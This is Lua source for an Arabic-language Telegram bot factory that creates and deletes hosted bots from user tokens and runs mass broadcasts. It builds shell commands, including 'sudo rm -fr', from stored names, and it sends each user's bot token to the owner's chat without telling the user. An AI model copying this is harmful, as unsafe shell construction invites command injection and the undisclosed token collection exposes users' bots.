if text == "💥 تعيين قناه البوت" then
Redis:set(Fast..msg.sender_id.user_id.."setchannel",true)
send(msg.chat_id,msg.id,"💥 ارسل الان يوزر القناه")
return false 
end
if text == "💥 تفعيل التواصل" then
Redis:del(Fast.."Tesla")
send(msg.chat_id,msg.id,"💥 تم تفعيل التواصل")
return false 
end
if text == "💥 تعطيل التواصل" then
Redis:set(Fast.."Tesla",true)
send(msg.chat_id,msg.id,"💥 تم تعطيل التواصل")
return false 
end
if text == "💥 الاحصائيات" then
photo = "https://t.me/narutologo/36"
local list = Redis:smembers(Fast.."totaui")
local JABWA = "*💥 عدد مشتركين بوتك『 "..#list.." 』مشترك*"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '💥 سورس فيجا 💥', url = 't.me/SOURCE_HORSE '},
},
}
local msgg = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo="..photo.."&caption=".. URL.escape(JABWA).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'رفع النسخه الاحتياطيه' and msg.reply_to_message_id ~= 0 or text == 'رفع نسخه احتياطيه' and msg.reply_to_message_id ~= 0 then
local Get_Info = io.open("./h.json","r"):read('*a')
local FilesJson = json:decode(Get_Info)
send(msg.chat_id,msg.id,'💥 جاري استرجاع نسخة الصانع ...')
Y = 0
for k,v in pairs(FilesJson.UsersBot) do
Y = Y + 1
Redis:sadd(Fast..'total',v)  
end
end
if text == "جلب نسخه" or text == "💥 جلب نسخة الصانع" then
local UsersBot = Redis:smembers(Fast.."total")
local Get_Json = '{"BotId": '..Fast..','  
if #UsersBot ~= 0 then 
Get_Json = Get_Json..'"UsersBot":['  
for k,v in pairs(UsersBot) do
if k == 1 then
Get_Json = Get_Json..'"'..v..'"'
else
Get_Json = Get_Json..',"'..v..'"'
end
end   
Get_Json = Get_Json..']'
end
local File = io.open('./'..UserBot..'.json', "w")
File:write(Get_Json)
File:close()
return LuaTele.sendDocument(msg.chat_id,msg.id,'./'..UserBot..'.json', '*• تم جلب النسخه الاحتياطيه\n• تحتوي على 0 جروب \n• وتحتوي على {'..#UsersBot..'} مشترك *\n', 'md')
end
----brodcast all
if Redis:get(Fast.."all:texting") then
if text == "الغاء" or text == '💥 الغاء الامر' then   
Redis:del(Fast.."all:texting")
send(msg.chat_id,msg.id, "\n 💥 تم الغاء الاذاعه","md",true)  
return false 
end 
Redis:set(Fast.."3z:gp",text)
Redis:del(Fast.."all:texting")
send(msg.chat_id,msg.id,"💥 جاري عمل الاذاعه لكل البوتات ومجموعاتهم يرجي الانتظار ...","html",true)
for folder in io.popen('ls'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
botuseriu = x[2] 
devbot = x[3]
botuoken = x[4]
list = Redis:smembers(bot_id.."ChekBotAdd") 
for k,v in pairs(list) do
https.request("https://api.telegram.org/bot"..botuoken.."/sendmessage?chat_id="..v.."&text="..URL.escape("["..Redis:get(Fast.."3z:gp").."]").."&parse_mode=Markdown")
end
end
end
Redis:del(Fast.."3z:gp")
Redis:del(Fast.."all:texting")
send(msg.chat_id,msg.id,"💥 تم انتهاء الاذاعه في كل البوتات","html",true)
end
if Redis:get(Fast.."all:texting:pv") then
if text == "الغاء" or text == '💥 الغاء الامر' then   
Redis:del(Fast.."all:texting:pv")
send(msg.chat_id,msg.id, "\n 💥 تم الغاء الاذاعه","md",true)  
return false 
end 
Redis:set(Fast.."eza3a:pv",text)
Redis:del(Fast.."all:texting:pv")
send(msg.chat_id,msg.id,"💥 جاري عمل الاذاعه لكل البوتات ومطورينهم ومشتركينهم يرجي الانتظار ...","html",true)
for folder in io.popen('ls'):lines() do
if folder:match('@[%a%d_]') then
m = Redis:get(folder)
x = {m:match("(.*)&(.*)$(.*)+(.*)")}
bot_id = x[1]
botuseriu = x[2] 
devbot = x[3]
botuoken = x[4]
list = Redis:smembers(bot_id.."Num:User:Pv") 
for k,v in pairs(list) do
https.request("https://api.telegram.org/bot"..botuoken.."/sendmessage?chat_id="..v.."&text="..URL.escape("["..Redis:get(Fast.."eza3a:pv").."]").."&parse_mode=Markdown")
end
end
end
Redis:del(Fast.."eza3a:pv")
Redis:del(Fast.."all:texting:pv")
send(msg.chat_id,msg.id,"💥 تم انتهاء الاذاعه في كل البوتات","html",true)
end
if text == "💥 اذاعه عام للمجموعات" then
Redis:set(Fast.."all:texting",true)
send(msg.chat_id,msg.id,"ارسل النص الان","html",true)
end
if text == "💥 اذاعه عام للمشتركين" then
Redis:set(Fast.."all:texting:pv",true)
send(msg.chat_id,msg.id,"ارسل النص الان","html",true)
end
if text == "💥 اذاعه بالتوجيه للمجموعات" then
Redis:set(Fast.."all:broadcast",true)
send(msg.chat_id,msg.id,"ارسل النص الان","html",true)
end
if text == "💥 اذاعه بالتوجيه للمشتركين" then
Redis:set(Fast.."all:broadcast:pv",true)
send(msg.chat_id,msg.id,"ارسل النص الان","html",true)
end
--brodcast
if Redis:get(Fast..msg.sender_id.user_id.."brodcast") then 
if text == "الغاء" or text == '💥 الغاء الامر' then   
Redis:del(Fast..msg.sender_id.user_id.."brodcast") 
send(msg.chat_id,msg.id, "\n 💥 تم الغاء الاذاعه","md",true)  
return false 
end 
local list = Redis:smembers(Fast.."totaui") 
if msg.content.video_note then
for k,v in pairs(list) do 
LuaTele.sendVideoNote(v, 0, msg.content.video_note.video.remote.id)
end
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
for k,v in pairs(list) do 
LuaTele.sendPhoto(v, 0, idPhoto,'')
end
elseif msg.content.sticker then 
for k,v in pairs(list) do 
LuaTele.sendSticker(v, 0, msg.content.sticker.sticker.remote.id)
end
elseif msg.content.voice_note then 
for k,v in pairs(list) do 
LuaTele.sendVoiceNote(v, 0, msg.content.voice_note.voice.remote.id, '', 'md')
end
elseif msg.content.video then 
for k,v in pairs(list) do 
LuaTele.sendVideo(v, 0, msg.content.video.video.remote.id, '', "md")
end
elseif msg.content.animation then 
for k,v in pairs(list) do 
LuaTele.sendAnimation(v,0, msg.content.animation.animation.remote.id, '', 'md')
end
elseif msg.content.document then
for k,v in pairs(list) do 
LuaTele.sendDocument(v, 0, msg.content.document.document.remote.id, '', 'md')
end
elseif msg.content.audio then
for k,v in pairs(list) do 
LuaTele.sendAudio(v, 0, msg.content.audio.audio.remote.id, '', "md") 
end
elseif text then   
for k,v in pairs(list) do 
send(v,0,text,"html",true)  
end
end
send(msg.chat_id,msg.id,"💥 تمت الاذاعه الى *『 "..#list.." 』* عضو في البوت ","md",true)      
Redis:del(Fast..msg.sender_id.user_id.."brodcast") 
return false
end
if text == "💥 اذاعه" then
Redis:set(Fast..msg.sender_id.user_id.."brodcast",true)
send(msg.chat_id,msg.id,"💥 ارسل الاذاعه الان")
return false 
end
---fwd
if Redis:get(Fast..msg.sender_id.user_id.."brodcast:fwd") then 
if text == "الغاء" or text == '💥 الغاء الامر' then   
Redis:del(Fast..msg.sender_id.user_id.."brodcast:fwd")
send(msg.chat_id,msg.id, "\n 💥 تم الغاء الاذاعه بالتوجيه","md",true)    
return false 
end 
if msg.forward_info then 
local list = Redis:smembers(Fast.."totaui") 
send(msg.chat_id,msg.id,"💥 تم التوجيه الى *『 "..#list.." 』* مشترك ف البوت ","md",true)      
for k,v in pairs(list) do  
LuaTele.forwardMessages(v, msg.chat_id, msg.id,0,0,true,false,false)
end   
Redis:del(Fast..msg.sender_id.user_id.."brodcast:fwd")
end 
return false
end
if text == "💥 اذاعه بالتوجيه" then
Redis:set(Fast..msg.sender_id.user_id.."brodcast:fwd",true)
send(msg.chat_id,msg.id,"💥 ارسل التوجيه الان")
return false 
end


end -- sudo cmd
--
if not Dev(msg) then
if text and ChannelJoin(msg.sender_id.user_id) == false then
chinfo = Redis:get(Fast.."ch:admin")
send(msg.chat_id,msg.id,'\n 💥 عليك الاشتراك في قناة البوت لاستخذام الاوامر\n\n'..chinfo..'')
return false 
end
if not Redis:get(Fast.."Tesla") then
if msg.sender_id.user_id ~= tonumber(Fast) then
if Redis:sismember(Fast..'BoI:In:Tuasl',msg.sender_id.user_id) then
return false 
end
if msg.id then
Redis:setex(Fast.."Twasl:UserId"..msg.date,172800,msg.sender_id.user_id)
LuaTele.forwardMessages(Sudo_Id, msg.chat_id, msg.id,0,0,true,false,false)
end   
end
end
if Redis:sismember(Fast..'BoI:In:Tuasl',msg.sender_id.user_id) then
return false 
end
if text and Redis:get(Fast.."free:bot") then
return send(msg.chat_id,msg.id,"💥 الوضع المجاني معطل من قبل مطور الصانع")
end
if text == "/start" then
if not Redis:sismember(Fast.."totaui",msg.sender_id.user_id) then
Redis:sadd(Fast.."totaui",msg.sender_id.user_id)
end
photo = "https://t.me/narutologo/42"
local T = "*💥 مـرحـبا انـا صـانـع بـوتـات\n💥 اقوم بصنع بوتات حمايه\n💥 تم برمجتي من قبل المطور مودي \n💥 للتنصيب الحمايه ارسل /vega\n💥 او اتبع الازرار بالاسفل*"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '💥 سورس هورس 💥', url = 't.me/SOURCE_HORSE'},
},
}
local msgg = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo="..photo.."&caption=".. URL.escape(T).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "/vega" then
if not Redis:sismember(Fast.."totaui",msg.sender_id.user_id) then
Redis:sadd(Fast.."totaui",msg.sender_id.user_id)
end
reply_markup = LuaTele.replyMarkup{type = 'keyboard',resize = true,is_personal = true,
data = {
{
{text = '💥صنع بوت',type = 'text'},{text = '💥 حذف بوت',type = 'text'},
},
{
{text = '💥 طريقة صنع بوت',type = 'text'},{text = '💥 سورس',type = 'text'},
},
{
{text = '💥 الغاء',type = 'text'},
},
}
}
send(msg.chat_id,msg.id,"*💥قم بصنع بوتك الان •*","md",true, false, false, true, reply_markup)
return false 
end
if text == '💥 طريقة صنع بوت' or text == 'مش شغال' or text == 'عاوز اعمل بوت' or text == 'عاوزه اعمل بوت' then
photo = "https://t.me/narutologo/40"
local T =[[*
▱▰▱▰▱▰▱▰▱▰▱▰▱▰

طريقه انشاء بوت من الصفر •

لو انت اول مره تعمل بوت •

في حياتك تابع •

يوزر بوت فازر (@BotFather) •

يوزر الصانع (@HORSE_2belalbot) •

▱▰▱▰▱▰▱▰▱▰▱▰▱▰
*]]
keyboard = {} 
keyboard.inline_keyboard = {
{  
{text = '💥 سورس هورس 💥', url = 't.me/SOURCE_HORSE '},
},
}
local msgg = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo="..photo.."&caption=".. URL.escape(T).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '⦁ طريقة صنع بوت' or text == 'مش شغال' or text == 'عاوز اعمل بوت' or text == 'عاوزه اعمل بوت' then
photo = "https://t.me/narutologo/40"
local T =[[*
▱▰▱▰▱▰▱▰▱▰▱▰▱▰

طريقه صنع بوت ميوزك مجنانا 🔰

من مصنع سورس هورس 💗

المصنع 🌝
- @HORSE_2belalbot ✨
المطور 💥
- @M_O_0D ⏺️

▱▰▱▰▱▰▱▰▱▰▱▰▱▰
*]]
keyboard = {} 
keyboard.inline_keyboard = {
{  
{text = '💥 سورس هورس 💥', url = 't.me/SOURCE_HORSE '},
},
}
local msgg = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo="..photo.."&caption=".. URL.escape(T).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '⦁ سورس' or text == '💥 سورس' or text == 'يا سورس' or text == 'source' then
photo = "https://t.me/narutologo/39"
local T =[[
 [💥𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐈𝐍 𝐒𝐎𝐔𝐑𝐂𝐄 𝐇𝐎𝐑𝐒𝐄💥](t.me/SOURCE_HORSE )
]]
keyboard = {} 
keyboard.inline_keyboard = {
{  
{text = '💥 سورس هورس 💥', url = 't.me/SOURCE_HORSE'},
},
}
local msgg = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo="..photo.."&caption=".. URL.escape(T).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
---making user
if text and Redis:get(Fast..msg.sender_id.user_id.."Fast:bot") then
if text == "💥 الغاء" then
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
send(msg.chat_id,msg.id,"💥 تم الغاء امر صناعه البوت")
return false 
end
local url = https.request("http://api.telegram.org/bot"..text.."/getme")
local json = JSON.decode(url)
if json.ok == true then
local botuseriu = json.result.username
if Redis:sismember(Fast.."userbots",botuseriu) then
send(msg.chat_id,msg.id, "\n 💥 عذرا هذا البوت مصنوع بالفعل","md",true)  
return false 
end 
local uu = LuaTele.getUser(msg.sender_id.user_id)
if uu.username then
username = uu.username
else
username = ""
end
if username == "" then
sudo_state = "["..uu.first_name.."](tg://user?id="..msg.sender_id.user_id..")" 
else
sudo_state = "[@"..username.."]" 
end
local Informationlua = io.open("./source/Information.lua", 'w')
Informationlua:write([[
return {
Token = "]]..text..[[",
UserBot = "]]..botuseriu..[[",
UserSudo = "]]..username..[[",
SudoId = ]]..msg.sender_id.user_id..[[
}
]])
Informationlua:close()
os.execute('cp -a ./source/. ./@'..botuseriu..' && cd @'..botuseriu..' && chmod +x * && screen -d -m -S '..botuseriu..' ./Run')
Redis:set(Fast..msg.sender_id.user_id.."potty:bot",botuseriu)
Redis:sadd(Fast.."userbots",botuseriu)
Redis:del(Fast..msg.sender_id.user_id.."Fast:bot")
send(Sudo_Id,0,"*✅ تم تنصيب بوت جديد*\n*⩹━★⊷⌯᥉᥆υᖇᥴᥱ 𝗁᥆ᖇ᥉ᥱ⌯⊶★━⩺ *\n*☁ توكن البوت* `"..text.."` \n*❇️ يوزر البوت @"..botuseriu.."*\n*🤖 يوزر المطور الاساسي* "..sudo_state.."","md",true)
send(msg.chat_id,msg.id,"*💥 تم تنصيب بوتك بنجاح ✅*\n*⩹━★⊷⌯᥉᥆υᖇᥴᥱ 𝗁᥆ᖇ᥉ᥱ⌯⊶★━⩺*\n*💥 يوزر البوت :-* @["..botuseriu.."] \n*💥 يوزر المطور الاساسي :- "..sudo_state.." *","md",true)
return false 
end
send(msg.chat_id,msg.id,"💥 التوكن غير صحيح تأكد منه")
end
if text == "💥صنع بوت" then
if Redis:get(Fast..msg.sender_id.user_id.."potty:bot") then
return send(msg.chat_id,msg.id,"💥 عفوا لديك بوت بالفعل احذفه اولا")
end
Redis:set(Fast..msg.sender_id.user_id.."Fast:bot",true)
photo = "https://t.me/narutologo/40"
local Text = "🤖 ارسل توكن بوتك الان"
local JABWA = "*🔰 للخروج من التنصيب ارسل الغاء*"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = Text, url = 't.me/SOURCE_HORSE '},
},
}
local msgg = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo="..photo.."&caption=".. URL.escape(JABWA).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
----end making user
if text == "💥 حذف بوت" then
if Redis:get(Fast..msg.sender_id.user_id.."potty:bot") then
local botuseriu = Redis:get(Fast..msg.sender_id.user_id.."potty:bot")
os.execute("sudo rm -fr @"..botuseriu)
os.execute("screen -X -S "..botuseriu.." quit")
Redis:srem(Fast.."userbots",botuseriu)
Redis:del(Fast..msg.sender_id.user_id.."potty:bot")
send(msg.chat_id,msg.id, "\n 💥 تم حذف البوت بنجاح","md",true)  
else
send(msg.chat_id,msg.id, "\n 💥 عفوا لم تصنع اي بوت من قبل","md",true)  
end
end


end --non Sudo_Id
end--msg.sender_id
end--Run
function callback(data)
if data and data.luatele and data.luatele == "updateNewMessage" then
if tonumber(data.message.sender_id.user_id) == tonumber(Fast) then
return false
end
Run(data.message,data.message)
elseif data and data.luatele and data.luatele == "updateMessageEdited" then
local Message_Edit = LuaTele.getMessage(data.chat_id, data.message_id)
if Message_Edit.sender_id.user_id == Fast then
return false
end
Run(Message_Edit,Message_Edit)
elseif data and data.luatele and data.luatele == "updateNewCallbackQuery" then
Text = LuaTele.base64_decode(data.payload.data)
IdUser = data.sender_id_user_id
ChatId = data.chat_id
Msg_id = data.message_id

end--data
end--callback 
luatele.run(callback)
